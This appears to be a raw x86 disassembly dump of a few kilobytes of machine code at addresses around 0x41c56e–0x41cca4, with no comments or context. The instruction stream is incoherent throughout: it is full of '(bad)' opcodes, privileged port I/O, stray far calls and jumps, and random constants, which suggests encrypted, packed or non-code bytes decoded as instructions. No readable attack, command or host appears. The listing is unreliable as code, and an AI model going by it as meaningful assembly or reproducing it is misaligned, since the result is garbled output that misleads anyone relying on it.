  41c56e:	in     eax,0xb2
  41c570:	ss adc eax,ebx
  41c573:	nop
  41c574:	xchg   esi,eax
  41c575:	mov    WORD PTR [ebp+0x3],?
  41c578:	sub    bh,al
  41c57a:	daa    
  41c57b:	loop   0x41c5ee
  41c57d:	pop    ss
  41c57e:	add    edx,DWORD PTR [esi-0x2c]
  41c581:	xor    eax,0xea80b9f5
  41c586:	mov    bh,0x56
  41c588:	push   cs
  41c589:	xchg   esp,eax
  41c58a:	jg     0x41c510
  41c58c:	dec    esi
  41c58d:	es dec esi
  41c58f:	enter  0x9763,0xfe
  41c593:	jae    0x41c583
  41c595:	icebp  
  41c596:	aad    0x2e
  41c598:	mov    bl,0x6b
  41c59a:	jecxz  0x41c5b1
  41c59c:	sbb    edi,DWORD PTR [eax-0x4d]
  41c59f:	jb     0x41c5da
  41c5a1:	lods   eax,DWORD PTR ds:[esi]
  41c5a2:	not    DWORD PTR [edi+0x424eabe6]
  41c5a8:	cmp    dh,dl
  41c5aa:	icebp  
  41c5ab:	into   
  41c5ac:	mov    dh,0xef
  41c5ae:	mov    al,ds:0x8b08629a
  41c5b3:	xchg   esi,eax
  41c5b4:	cmp    esi,DWORD PTR [eax]
  41c5b6:	sub    al,0x3c
  41c5b8:	sub    BYTE PTR [edi+esi*1-0x22],bl
  41c5bc:	mov    ah,0xe0
  41c5be:	retf   
  41c5bf:	cli    
  41c5c0:	pop    esi
  41c5c1:	and    ch,BYTE PTR [ebp+0x427b3a0d]
  41c5c7:	jne    0x41c553
  41c5c9:	jbe    0x41c5e3
  41c5cb:	dec    ebp
  41c5cc:	pushf  
  41c5cd:	mov    ah,ah
  41c5cf:	or     BYTE PTR [edx],dh
  41c5d1:	add    al,0x4a
  41c5d3:	push   0x9802313
  41c5d8:	jbe    0x41c5c4
  41c5da:	test   DWORD PTR [ebp-0x71519cce],ebx
  41c5e0:	das    
  41c5e1:	sahf   
  41c5e2:	cmp    al,0x21
  41c5e4:	mov    ch,0x5f
  41c5e6:	cmp    BYTE PTR [ecx+0x7d],0xa
  41c5ea:	fdivr  DWORD PTR [edi+edi*8-0x2ad1fe7a]
  41c5f1:	popf   
  41c5f2:	and    eax,0xe2f5b112
  41c5f7:	xlat   BYTE PTR ds:[ebx]
  41c5f8:	sbb    ah,BYTE PTR [edx+0x21741760]
  41c5fe:	mov    ch,0x72
  41c600:	inc    ecx
  41c601:	out    dx,eax
  41c602:	shr    BYTE PTR [esi+0x248cf3bd],1
  41c608:	aas    
  41c609:	dec    esi
  41c60a:	pushf  
  41c60b:	jae    0x41c684
  41c60d:	int    0xfa
  41c60f:	jae    0x41c64e
  41c611:	cmp    dh,BYTE PTR [ecx-0x39]
  41c614:	(bad)  
  41c615:	lock pop es
  41c617:	inc    edi
  41c618:	xchg   edx,eax
  41c619:	or     al,0x1b
  41c61b:	lods   eax,DWORD PTR ds:[esi]
  41c61c:	push   ss
  41c61d:	push   esi
  41c61f:	sub    DWORD PTR [edi+0x48],edx
  41c622:	dec    esi
  41c623:	ret    
  41c624:	sbb    DWORD PTR ds:[ecx-0x6c],ebx
  41c628:	pop    edi
  41c629:	sub    ebx,edx
  41c62b:	xor    al,0x69
  41c62d:	out    dx,al
  41c62e:	es enter 0xa7d8,0x57
  41c633:	jl     0x41c676
  41c635:	mov    edx,0x958dc9ba
  41c63a:	and    al,0xd5
  41c63c:	daa    
  41c63d:	fs cmp ecx,ebx
  41c640:	xchg   BYTE PTR [ebx-0x41ea1a5e],bh
  41c646:	call   0x1a95:0xb07b1fb4
  41c64d:	int3   
  41c64e:	xor    al,BYTE PTR [edx]
  41c650:	mov    ebp,0xbd6bf616
  41c655:	and    BYTE PTR [ebx+0x76],bh
  41c658:	push   ecx
  41c659:	lds    ebp,FWORD PTR [esi]
  41c65b:	xchg   BYTE PTR [ebp+ebx*8-0x4b],ah
  41c65f:	xchg   ebp,eax
  41c660:	popa   
  41c661:	(bad)  [ecx+0x79]
  41c664:	ds repnz data16 out dx,al
  41c668:	cmc    
  41c669:	out    0x2b,eax
  41c66b:	add    BYTE PTR [edi],ah
  41c66d:	mov    ds:0xcb870924,al
  41c672:	sub    BYTE PTR [ecx+0x2a],dh
  41c675:	xchg   edi,eax
  41c676:	in     al,dx
  41c677:	pop    ebp
  41c678:	sub    dl,dh
  41c67a:	mov    dl,0x8c
  41c67c:	stos   DWORD PTR es:[edi],eax
  41c67d:	lahf   
  41c67e:	enter  0x7ca5,0x14
  41c682:	add    al,0x45
  41c684:	pop    edi
  41c685:	jo     0x41c627
  41c687:	test   DWORD PTR ss:[esi-0x72],edi
  41c68b:	fs imul edx,ebx,0x5317f28b
  41c692:	add    BYTE PTR [edi],dl
  41c694:	add    ecx,DWORD PTR [edx+0x1f]
  41c697:	add    dl,BYTE PTR [eax+ebx*2-0x7be0f0ab]
  41c69e:	popa   
  41c69f:	sub    eax,0x20c7b433
  41c6a4:	and    eax,0x3f9207ce
  41c6a9:	rcr    BYTE PTR [edi],0xdd
  41c6ac:	push   ebp
  41c6ad:	mov    esp,0xdf2938d2
  41c6b2:	fucomi st,st(3)
  41c6b4:	push   esp
  41c6b5:	cmp    bh,BYTE PTR ds:0xf38ac04b
  41c6bb:	sbb    ecx,DWORD PTR [edx+0x5497373b]
  41c6c1:	lods   eax,DWORD PTR ds:[esi]
  41c6c2:	xchg   edi,eax
  41c6c3:	cmc    
  41c6c4:	cmc    
  41c6c5:	stos   BYTE PTR es:[edi],al
  41c6c6:	jns    0x41c6ec
  41c6c8:	mov    DWORD PTR [esi],ecx
  41c6ca:	dec    ecx
  41c6cb:	adc    edx,DWORD PTR [ebp+0x5af2e37f]
  41c6d1:	push   edx
  41c6d2:	mov    WORD PTR [eax],?
  41c6d4:	xor    bh,BYTE PTR ds:0x6684bf9b
  41c6da:	cmc    
  41c6db:	leave  
  41c6dc:	das    
  41c6dd:	stos   DWORD PTR es:[edi],eax
  41c6de:	sbb    BYTE PTR [eax-0x12],0x9b
  41c6e2:	xchg   bh,cl
  41c6e4:	sub    ebp,eax
  41c6e6:	mov    ecx,0x435862a5
  41c6eb:	rcr    BYTE PTR [ecx+0x1d],0x18
  41c6ef:	mov    bh,0x99
  41c6f1:	shl    DWORD PTR [edx+0xd],0x64
  41c6f5:	cmp    eax,0xcf8bb8c4
  41c6fa:	ja     0x41c6d5
  41c6fc:	fucomp st(7)
  41c6fe:	outs   dx,BYTE PTR ds:[esi]
  41c6ff:	mov    dh,0xc8
  41c701:	arpl   WORD PTR [eax-0x353daca0],sp
  41c707:	cmp    al,ah
  41c709:	mov    WORD PTR [eax],?
  41c70b:	xor    al,BYTE PTR [esi+ebx*1+0x4d]
  41c70f:	aaa    
  41c710:	xlat   BYTE PTR ds:[ebx]
  41c711:	push   eax
  41c712:	pushf  
  41c713:	fcmovu st,st(1)
  41c715:	push   edi
  41c716:	and    esp,DWORD PTR [ecx+0x5175099f]
  41c71c:	add    al,0x2c
  41c71e:	jbe    0x41c793
  41c720:	xchg   ebx,eax
  41c721:	jge    0x41c762
  41c723:	jl     0x41c762
  41c725:	out    0xd3,al
  41c727:	test   edx,edx
  41c729:	jmp    0x41c761
  41c72b:	or     eax,0xb80aec41
  41c730:	sahf   
  41c731:	sbb    eax,eax
  41c733:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c734:	sub    DWORD PTR ds:0x1410e70d,0xffffff83
  41c73b:	sbb    eax,0xcb545835
  41c740:	add    eax,0x6c7ee628
  41c745:	pushf  
  41c746:	or     DWORD PTR [esp+edi*8],0xffffffb8
  41c74a:	jmp    0x38b7:0x6c2effef
  41c751:	in     eax,dx
  41c752:	adc    BYTE PTR [edi],al
  41c754:	ds mov dl,0x35
  41c757:	test   BYTE PTR [esi+0x31],0x36
  41c75b:	fs pop ebp
  41c75d:	and    DWORD PTR [eax+0x332527b0],0xffffff83
  41c764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c766:	test   bh,dl
  41c768:	out    dx,al
  41c769:	adc    dh,cl
  41c76b:	aad    0x6e
  41c76d:	and    cl,bl
  41c76f:	adc    al,0xff
  41c771:	lahf   
  41c772:	inc    edx
  41c773:	pushf  
  41c774:	and    DWORD PTR [esi+0x25],edi
  41c777:	or     al,dl
  41c779:	or     dl,ch
  41c77b:	bound  ecx,QWORD PTR [ebx]
  41c77d:	jge    0x41c7d3
  41c77f:	dec    edx
  41c780:	sub    al,0xc8
  41c782:	ficomp WORD PTR [ecx]
  41c784:	mov    ds:0xe34ae2a9,eax
  41c789:	or     DWORD PTR [ecx-0x796ac904],esi
  41c78f:	xor    ah,dl
  41c791:	loopne 0x41c739
  41c793:	pop    ebp
  41c794:	mov    eax,esi
  41c796:	dec    esp
  41c797:	inc    esp
  41c798:	clc    
  41c799:	jge    0x41c771
  41c79b:	or     dl,BYTE PTR [edi-0x56]
  41c79e:	sbb    cl,BYTE PTR [eax+0x40c3833a]
  41c7a4:	cmc    
  41c7a5:	inc    edi
  41c7a6:	fistp  DWORD PTR [edi+0x2]
  41c7a9:	stc    
  41c7aa:	aam    0x42
  41c7ac:	dec    ebp
  41c7ad:	pop    ss
  41c7ae:	stos   BYTE PTR es:[edi],al
  41c7af:	pop    ebp
  41c7b0:	sbb    ebp,DWORD PTR [ecx]
  41c7b2:	push   ecx
  41c7b3:	and    cl,bh
  41c7b5:	mov    bp,WORD PTR [ebx+0x6686874e]
  41c7bc:	sub    eax,0xeefb972d
  41c7c1:	loopne 0x41c7a4
  41c7c3:	mov    ecx,0xc30ed00a
  41c7c8:	loop   0x41c76d
  41c7ca:	push   0x264189c6
  41c7cf:	lds    eax,FWORD PTR [esi-0x7c]
  41c7d2:	and    al,cl
  41c7d4:	xor    cl,BYTE PTR [eax+0x13]
  41c7d7:	xor    DWORD PTR [edx-0x47f8f0d4],0xa7e42ac9
  41c7e1:	(bad)  
  41c7e2:	cld    
  41c7e3:	mov    bl,0x79
  41c7e5:	aas    
  41c7e6:	cmp    ebx,DWORD PTR [esi-0x639cb2c2]
  41c7ec:	bound  ecx,QWORD PTR [eax]
  41c7ee:	adc    bl,BYTE PTR [eax]
  41c7f0:	rep ins BYTE PTR es:[edi],dx
  41c7f2:	xchg   DWORD PTR [eax],ebp
  41c7f4:	pusha  
  41c7f5:	jp     0x41c81b
  41c7f7:	fwait
  41c7f8:	inc    ebp
  41c7f9:	push   0x5c
  41c7fb:	(bad)  
  41c7fc:	push   ecx
  41c7fd:	rcl    DWORD PTR [esi-0x3],1
  41c800:	in     al,dx
  41c801:	test   ah,ch
  41c803:	in     al,0xe
  41c805:	xchg   DWORD PTR [ebx+0xfe43303],esi
  41c80b:	fadd   DWORD PTR [ebp+0x9]
  41c80e:	mov    edi,0x628122ad
  41c813:	pop    ebp
  41c814:	and    ch,BYTE PTR [ecx+ecx*2]
  41c817:	ret    
  41c818:	xchg   BYTE PTR [ebx+0x5a372858],dh
  41c81e:	xchg   edx,eax
  41c81f:	rcl    BYTE PTR [ebp-0x705d11ea],0x37
  41c826:	mov    ebx,0x9a0567e0
  41c82b:	mov    ds:0xdc42a2ef,eax
  41c830:	xor    eax,0x92ca781d
  41c835:	(bad)  
  41c836:	clc    
  41c837:	call   0x1d13e13b
  41c83c:	and    bl,0xf7
  41c83f:	neg    BYTE PTR [esp+ebp*1]
  41c842:	(bad)  
  41c843:	mov    ecx,0x4d8dfb26
  41c848:	xchg   edx,eax
  41c849:	push   edx
  41c84a:	cmc    
  41c84b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c84c:	cmp    BYTE PTR [ebp+0x5e1d8495],0xf5
  41c853:	or     ecx,DWORD PTR [edi]
  41c855:	sub    ebx,edi
  41c857:	cdq    
  41c858:	dec    eax
  41c859:	or     BYTE PTR [eax],ch
  41c85b:	ret    0x6959
  41c85e:	cmp    DWORD PTR [ebx+eax*1],ebp
  41c861:	outs   dx,BYTE PTR ds:[esi]
  41c862:	pop    edx
  41c863:	pop    eax
  41c864:	outs   dx,DWORD PTR ds:[esi]
  41c865:	ret    
  41c866:	or     edi,ecx
  41c868:	mov    ah,dh
  41c86a:	popf   
  41c86b:	retf   0x3ddb
  41c86e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c86f:	es ins DWORD PTR es:[edi],dx
  41c871:	push   ebx
  41c872:	outs   dx,BYTE PTR ds:[esi]
  41c873:	aad    0x24
  41c875:	fcmove st,st(0)
  41c877:	cld    
  41c878:	mov    ecx,0x87e22655
  41c87d:	mov    edi,0x47153327
  41c882:	dec    eax
  41c883:	lods   al,BYTE PTR ds:[esi]
  41c884:	rcl    BYTE PTR [esi-0x56],cl
  41c887:	cmp    al,0x7b
  41c889:	inc    edi
  41c88a:	xchg   DWORD PTR [edx-0x2f],ebx
  41c88d:	(bad)  
  41c88e:	dec    ebp
  41c88f:	inc    edx
  41c890:	(bad)  
  41c893:	pop    esp
  41c894:	jbe    0x41c817
  41c896:	jns    0x41c8dc
  41c898:	dec    ebp
  41c899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c89a:	sahf   
  41c89b:	jno    0x41c8f9
  41c89d:	xor    bl,al
  41c89f:	mov    ss,ecx
  41c8a1:	cmp    BYTE PTR [edi+eax*8],0xc2
  41c8a5:	nop
  41c8a6:	aad    0xd
  41c8a8:	loop   0x41c8c5
  41c8aa:	xchg   edx,eax
  41c8ab:	and    eax,edx
  41c8ad:	fisub  DWORD PTR [ecx+0x47]
  41c8b0:	fcmovne st,st(3)
  41c8b2:	scas   al,BYTE PTR es:[edi]
  41c8b3:	and    BYTE PTR [edx+eax*8+0xa],ch
  41c8b7:	sbb    eax,0xed6a22b7
  41c8bc:	mov    DWORD PTR [ecx-0x28ee9bcf],esp
  41c8c2:	jl     0x41c85a
  41c8c4:	daa    
  41c8c5:	es cs cwde 
  41c8c8:	pop    edx
  41c8c9:	loop   0x41c91f
  41c8cb:	mov    bh,0x89
  41c8cd:	fnstsw WORD PTR [ebp+0x990d76b]
  41c8d3:	lods   eax,DWORD PTR ds:[esi]
  41c8d4:	sbb    al,0x32
  41c8d6:	mov    cl,0x76
  41c8d8:	mov    ds:0x94513fab,eax
  41c8dd:	mov    edx,0xe82e9933
  41c8e2:	sbb    BYTE PTR [eax],ah
  41c8e4:	xor    eax,0x68287433
  41c8e9:	or     DWORD PTR [edx],edx
  41c8eb:	and    eax,0x34c0b916
  41c8f0:	push   ecx
  41c8f1:	ss repz add ebp,ebp
  41c8f5:	retf   0x447e
  41c8f8:	fstp   st(6)
  41c8fa:	dec    eax
  41c8fb:	mov    bl,0xce
  41c8fd:	dec    edx
  41c8fe:	fwait
  41c8ff:	xor    eax,0x246dfb3b
  41c904:	cmp    al,0xbd
  41c906:	cmp    eax,0x48a00486
  41c90b:	mov    esp,edx
  41c90d:	dec    di
  41c90f:	or     bl,BYTE PTR [edi-0x323d32a]
  41c915:	cmp    bl,bh
  41c917:	xchg   ebx,eax
  41c918:	inc    edi
  41c919:	test   BYTE PTR [edx+0x62],0x58
  41c91d:	int    0x2a
  41c91f:	call   ecx
  41c921:	in     al,dx
  41c922:	or     BYTE PTR [esi],0xb3
  41c925:	loop   0x41c8e4
  41c927:	rol    DWORD PTR [ecx],1
  41c929:	push   cs
  41c92a:	pushf  
  41c92b:	out    0x37,eax
  41c92d:	fst    QWORD PTR [esi-0x1d471e8f]
  41c934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c935:	addr16 arpl ax,bp
  41c938:	mov    ebp,0xac12e6
  41c93d:	mov    esi,0xdccda318
  41c942:	stos   BYTE PTR es:[edi],al
  41c943:	sahf   
  41c944:	sbb    al,0xab
  41c946:	xlat   BYTE PTR ds:[ebx]
  41c947:	(bad)  
  41c948:	mov    cl,0x34
  41c94a:	scas   eax,DWORD PTR es:[edi]
  41c94b:	aam    0x10
  41c94d:	push   0xffffffac
  41c94f:	sahf   
  41c950:	clc    
  41c951:	mov    al,al
  41c953:	enter  0x3d14,0x39
  41c957:	sar    ch,1
  41c959:	std    
  41c95a:	(bad)  
  41c95b:	in     al,0x9
  41c95d:	push   esp
  41c95e:	loopne 0x41c9b2
  41c960:	inc    esi
  41c961:	sar    DWORD PTR [eax-0x452bb99f],0x54
  41c968:	xlat   BYTE PTR ds:[ebx]
  41c969:	xor    al,0xbe
  41c96b:	arpl   WORD PTR [eax-0x4cf38808],cx
  41c971:	hlt    
  41c972:	scas   al,BYTE PTR es:[edi]
  41c973:	out    dx,eax
  41c974:	mov    eax,ss
  41c976:	xlat   BYTE PTR ds:[ebx]
  41c977:	js     0x41c958
  41c979:	mov    edi,DWORD PTR [esi]
  41c97b:	daa    
  41c97c:	fistp  DWORD PTR [edx-0x3b5b1792]
  41c982:	sub    ch,BYTE PTR [edi-0x60a02d11]
  41c988:	ins    BYTE PTR es:[edi],dx
  41c989:	mov    ds:0xe3794813,eax
  41c98e:	jmp    0x7432c89a
  41c993:	std    
  41c994:	add    eax,0xa9773d84
  41c999:	xlat   BYTE PTR ds:[ebx]
  41c99a:	and    eax,0xce757600
  41c99f:	mov    ah,0xf1
  41c9a1:	push   esi
  41c9a2:	pop    ebx
  41c9a3:	imul   edi,DWORD PTR [esi-0x21],0xfc358465
  41c9aa:	and    al,0xeb
  41c9ac:	into   
  41c9ad:	adc    eax,0x7deff475
  41c9b2:	loope  0x41c954
  41c9b4:	ins    DWORD PTR es:[edi],dx
  41c9b5:	aaa    
  41c9b6:	das    
  41c9b7:	xor    al,0x1d
  41c9b9:	cmc    
  41c9ba:	icebp  
  41c9bb:	icebp  
  41c9bc:	clc    
  41c9bd:	jae    0x41ca0e
  41c9bf:	adc    eax,edi
  41c9c1:	mov    esi,0x6f3efe09
  41c9c6:	aam    0x6c
  41c9c8:	out    dx,al
  41c9c9:	xlat   BYTE PTR ds:[ebx]
  41c9ca:	test   edx,eax
  41c9cc:	sub    edx,esp
  41c9ce:	add    al,0xd6
  41c9d0:	sbb    al,0x5a
  41c9d2:	mov    dl,0x17
  41c9d4:	xchg   ebx,eax
  41c9d5:	std    
  41c9d6:	sub    BYTE PTR [ebp+0x7ff42030],dh
  41c9dc:	add    eax,0x522181ae
  41c9e1:	push   ecx
  41c9e2:	retf   0xffb5
  41c9e5:	icebp  
  41c9e6:	pop    esp
  41c9e7:	std    
  41c9e8:	into   
  41c9e9:	sub    DWORD PTR [edx+0x12ec9eb7],edx
  41c9ef:	cmp    al,0x9b
  41c9f1:	mov    WORD PTR [eax],ds
  41c9f3:	int    0x1f
  41c9f5:	cmp    ch,BYTE PTR [ebx+0x6e]
  41c9f8:	(bad)  
  41c9f9:	adc    cl,BYTE PTR [edi-0x1c99bcae]
  41c9ff:	mov    edx,0x38191a56
  41ca04:	xchg   ah,cl
  41ca06:	shr    DWORD PTR [eax-0x2],cl
  41ca09:	sbb    eax,0xfd5f923f
  41ca0e:	mov    esi,0xf1c375ca
  41ca13:	dec    esp
  41ca14:	fstp   QWORD PTR [edi]
  41ca16:	ret    
  41ca17:	in     eax,dx
  41ca18:	dec    esi
  41ca19:	add    bh,BYTE PTR [esi+0x73]
  41ca1c:	jge    0x41c9cb
  41ca1e:	dec    BYTE PTR [edi]
  41ca20:	pop    ebp
  41ca21:	xor    BYTE PTR [edx-0x3a],0xfd
  41ca25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca26:	aaa    
  41ca27:	push   0x77a4e6f8
  41ca2c:	(bad)  
  41ca2d:	aas    
  41ca2e:	cld    
  41ca2f:	je     0x41ca13
  41ca31:	cwde   
  41ca32:	or     DWORD PTR [ebp+0x6b6c5e85],eax
  41ca38:	ja     0x41cab9
  41ca3a:	jo     0x41cab7
  41ca3c:	cld    
  41ca3d:	xchg   ebx,eax
  41ca3e:	xchg   ebp,eax
  41ca3f:	aaa    
  41ca40:	push   esp
  41ca41:	xchg   ebp,eax
  41ca42:	xor    al,0x1d
  41ca44:	sti    
  41ca45:	std    
  41ca46:	jno    0x41c9fd
  41ca48:	cmp    eax,0xbefbc02c
  41ca4d:	inc    esi
  41ca4e:	sub    eax,0x29583ddc
  41ca53:	sbb    bh,bh
  41ca55:	sti    
  41ca56:	add    DWORD PTR [ebp-0x5c],ebx
  41ca59:	push   edx
  41ca5a:	pop    ss
  41ca5b:	push   ss
  41ca5c:	sbb    DWORD PTR [ecx+0x2f],ebp
  41ca5f:	xchg   DWORD PTR [edi-0x65],esi
  41ca62:	or     eax,0x9cda5827
  41ca67:	adc    bh,BYTE PTR [ebp-0x6f5f3a81]
  41ca6d:	fs out dx,al
  41ca6f:	(bad)  
  41ca70:	je     0x41ca2c
  41ca72:	int3   
  41ca73:	imul   eax,DWORD PTR [esi+0x52756f80],0x7
  41ca7a:	es and al,0x96
  41ca7d:	cmp    eax,0xec5fc25e
  41ca82:	xor    BYTE PTR [ecx+0x19cd1fe0],ah
  41ca88:	push   0xffffffff
  41ca8a:	cld    
  41ca8b:	cmp    al,BYTE PTR [eax]
  41ca8d:	mov    edx,0x638d8e98
  41ca92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca93:	cld    
  41ca94:	push   esi
  41ca95:	pop    eax
  41ca96:	popf   
  41ca97:	pop    edx
  41ca98:	xor    cl,BYTE PTR [esi+0x538f9830]
  41ca9e:	xor    DWORD PTR [esi-0xf],esp
  41caa1:	stos   DWORD PTR es:[edi],eax
  41caa2:	and    dh,BYTE PTR [esi-0x3820d5d1]
  41caa8:	sahf   
  41caa9:	neg    DWORD PTR [ebx-0x48]
  41caac:	and    eax,0x230fc6ac
  41cab1:	into   
  41cab2:	sub    al,0xa0
  41cab4:	push   edi
  41cab5:	cmc    
  41cab6:	and    ch,BYTE PTR [edx+ebx*8+0x6c]
  41caba:	sub    DWORD PTR [eax-0x5adc7b42],ecx
  41cac0:	das    
  41cac1:	jmp    0x1c510395
  41cac6:	mov    bl,0xb7
  41cac8:	xchg   ebx,eax
  41cac9:	push   ss
  41caca:	push   ecx
  41cacb:	repz cmp eax,0xf156b630
  41cad1:	xor    DWORD PTR [ebx],ebx
  41cad3:	ss je  0x41ca9b
  41cad6:	fcom   DWORD PTR [ecx-0x3]
  41cad9:	xchg   BYTE PTR ds:0x7244f25e,bh
  41cadf:	js     0x41cb17
  41cae1:	xchg   edx,eax
  41cae2:	xchg   esi,eax
  41cae3:	mov    eax,0xcc341f5a
  41cae8:	aad    0x65
  41caea:	sbb    eax,0x5607aa2d
  41caef:	ins    BYTE PTR es:[edi],dx
  41caf0:	xor    BYTE PTR [ebp-0x34],dh
  41caf3:	fisubr WORD PTR [ebp+0x7237a20b]
  41caf9:	call   FWORD PTR [ecx]
  41cafb:	aad    0x36
  41cafd:	dec    esp
  41cafe:	inc    edi
  41caff:	cmp    DWORD PTR [ecx-0x2],edx
  41cb02:	xor    BYTE PTR [esi],bh
  41cb04:	(bad)  
  41cb05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb06:	div    dh
  41cb08:	mov    ds:0xc47eaf7e,al
  41cb0d:	(bad)  
  41cb0e:	adc    ah,bl
  41cb10:	fdivr  st(5),st
  41cb12:	xchg   ebp,eax
  41cb13:	inc    edx
  41cb14:	fcom   DWORD PTR [esi-0x29120d29]
  41cb1a:	mov    ebx,0xc25ef8
  41cb1f:	dec    ebx
  41cb20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb21:	dec    esp
  41cb22:	cs jns 0x41cb60
  41cb25:	push   edx
  41cb26:	push   0x68b6c892
  41cb2b:	mov    bl,0xfb
  41cb2d:	cmp    DWORD PTR [ecx-0x7c5694a],ebp
  41cb33:	push   eax
  41cb34:	pop    edx
  41cb35:	imul   eax,DWORD PTR [esi],0xffffffe2
  41cb38:	jecxz  0x41cb6e
  41cb3a:	sbb    BYTE PTR [edi],bl
  41cb3c:	and    DWORD PTR ds:0x43de47d4,ebx
  41cb42:	ins    BYTE PTR es:[edi],dx
  41cb43:	xchg   ebx,eax
  41cb44:	retf   0x3db7
  41cb47:	cmp    esp,DWORD PTR ss:[ebp-0x77]
  41cb4b:	out    dx,eax
  41cb4c:	mov    cl,0x28
  41cb4e:	and    DWORD PTR [eax-0x3e9d3aa3],esp
  41cb54:	cmc    
  41cb55:	sbb    al,0xcb
  41cb57:	add    edi,DWORD PTR [ebx]
  41cb59:	fwait
  41cb5a:	or     edx,DWORD PTR [eax-0x74]
  41cb5d:	sbb    ebx,ebp
  41cb5f:	xchg   edi,eax
  41cb60:	inc    esi
  41cb61:	add    eax,eax
  41cb63:	and    dh,BYTE PTR [edx+0x2b799425]
  41cb69:	fisttp WORD PTR [ecx]
  41cb6b:	dec    edx
  41cb6c:	dec    ecx
  41cb6d:	loope  0x41caff
  41cb6f:	popa   
  41cb70:	fabs   
  41cb72:	jae    0x41cbaa
  41cb74:	(bad)  
  41cb75:	mov    WORD PTR [eax-0x61],gs
  41cb78:	pushf  
  41cb79:	xor    eax,ebp
  41cb7b:	stos   DWORD PTR es:[edi],eax
  41cb7c:	aad    0x20
  41cb7e:	pop    esp
  41cb7f:	hlt    
  41cb80:	loop   0x41cbde
  41cb82:	aas    
  41cb83:	add    eax,0x53e40302
  41cb88:	stos   DWORD PTR es:[edi],eax
  41cb89:	xchg   ebp,eax
  41cb8a:	lahf   
  41cb8b:	xchg   ah,ch
  41cb8d:	fsub   QWORD PTR [edi]
  41cb8f:	mov    al,0x6e
  41cb91:	adc    BYTE PTR [esi+eax*2],dh
  41cb94:	loop   0x41cb4d
  41cb96:	scas   al,BYTE PTR es:[edi]
  41cb97:	aam    0x87
  41cb99:	xlat   BYTE PTR ds:[ebx]
  41cb9a:	mov    esp,0x8e91bbb2
  41cb9f:	jb     0x41cb25
  41cba1:	ror    dl,cl
  41cba3:	mov    edx,0x26c14b61
  41cba8:	lds    ecx,FWORD PTR [esi+0x590872a6]
  41cbae:	jmp    0x5e7ac53
  41cbb3:	sub    ch,BYTE PTR [ebp-0x1c]
  41cbb6:	mov    ds:0xffbafd5d,eax
  41cbbb:	sbb    al,BYTE PTR [edi]
  41cbbd:	clc    
  41cbbe:	adc    al,0xfb
  41cbc0:	cmp    DWORD PTR [ebx-0x23be9e5],ebp
  41cbc6:	rcl    BYTE PTR [edi+0xe5d893d],cl
  41cbcc:	mov    eax,ds:0x8d4bbeb
  41cbd1:	cmp    al,0xd2
  41cbd3:	idiv   BYTE PTR [ebx+0x68dd79a5]
  41cbd9:	dec    esi
  41cbda:	out    dx,al
  41cbdb:	ins    BYTE PTR es:[edi],dx
  41cbdc:	das    
  41cbdd:	add    eax,0xdb711b55
  41cbe2:	test   eax,0x6098db4f
  41cbe7:	and    ch,0x4
  41cbea:	xchg   DWORD PTR [eax+0x2d95ac6a],esp
  41cbf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbf1:	fisubr WORD PTR [ecx]
  41cbf3:	and    BYTE PTR [edi+0x26e88914],0x55
  41cbfa:	mov    esp,0xebeddf4
  41cbff:	xlat   BYTE PTR ds:[ebx]
  41cc00:	mov    ch,0x21
  41cc02:	mov    al,0xb5
  41cc04:	or     eax,eax
  41cc06:	push   eax
  41cc07:	out    dx,al
  41cc08:	xchg   ebx,eax
  41cc09:	mov    cl,BYTE PTR [esi-0x441ea28b]
  41cc0f:	dec    ebp
  41cc10:	and    esi,DWORD PTR [esi]
  41cc12:	scas   eax,DWORD PTR es:[edi]
  41cc13:	adc    BYTE PTR [edi-0x2e327e0a],ch
  41cc19:	rcr    DWORD PTR [esi],cl
  41cc1b:	repnz push esp
  41cc1d:	push   ecx
  41cc1e:	call   0x222d:0xcc60122c
  41cc25:	fcom   st(7)
  41cc27:	sbb    DWORD PTR [edi],0xffffffed
  41cc2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc2c:	pop    ebp
  41cc2d:	ins    BYTE PTR es:[edi],dx
  41cc2e:	gs loope 0x41cc8c
  41cc31:	fsubr  DWORD PTR [ebx]
  41cc33:	cmova  ecx,DWORD PTR [esi]
  41cc36:	mov    ecx,DWORD PTR ds:0x167267ac
  41cc3c:	ret    0xa5b1
  41cc3f:	aam    0x99
  41cc41:	xchg   esi,eax
  41cc42:	add    edx,edi
  41cc44:	(bad)  
  41cc45:	mov    al,0x8c
  41cc47:	mov    cl,bh
  41cc49:	push   es
  41cc4a:	push   ebp
  41cc4b:	int3   
  41cc4c:	sbb    BYTE PTR [ecx+0x20],ah
  41cc4f:	into   
  41cc50:	clc    
  41cc51:	jne    0x41cc3b
  41cc53:	jno    0x41ccd3
  41cc55:	jb     0x41cc0d
  41cc57:	cmp    eax,DWORD PTR [edi-0x80]
  41cc5a:	mov    ebp,0xbf74b455
  41cc5f:	dec    ecx
  41cc60:	pop    esi
  41cc61:	push   0x7b141d79
  41cc66:	or     BYTE PTR [ebx+0x18],0xa8
  41cc6a:	sub    esi,DWORD PTR [eax+0x4a90c029]
  41cc70:	push   edx
  41cc71:	fldcw  WORD PTR [esi-0x554d7294]
  41cc77:	sti    
  41cc78:	mov    ah,0xd
  41cc7a:	mov    eax,0xf2fa4c5d
  41cc7f:	imul   edi,DWORD PTR [edx+0x6f],0xb9edb26f
  41cc86:	jns    0x41cd05
  41cc88:	inc    DWORD PTR [ebp+0x68bdea13]
  41cc8e:	outs   dx,BYTE PTR ds:[esi]
  41cc8f:	(bad)  
  41cc90:	ins    DWORD PTR es:[edi],dx
  41cc91:	dec    esi
  41cc92:	inc    eax
  41cc93:	imul   edx,DWORD PTR [esi+0x1415885c],0x4c5c0b30
  41cc9d:	jecxz  0x41ccab
  41cc9f:	retf   0xaf29
  41cca2:	gs dec edi
  41cca4:	loopne 0x41ccaa
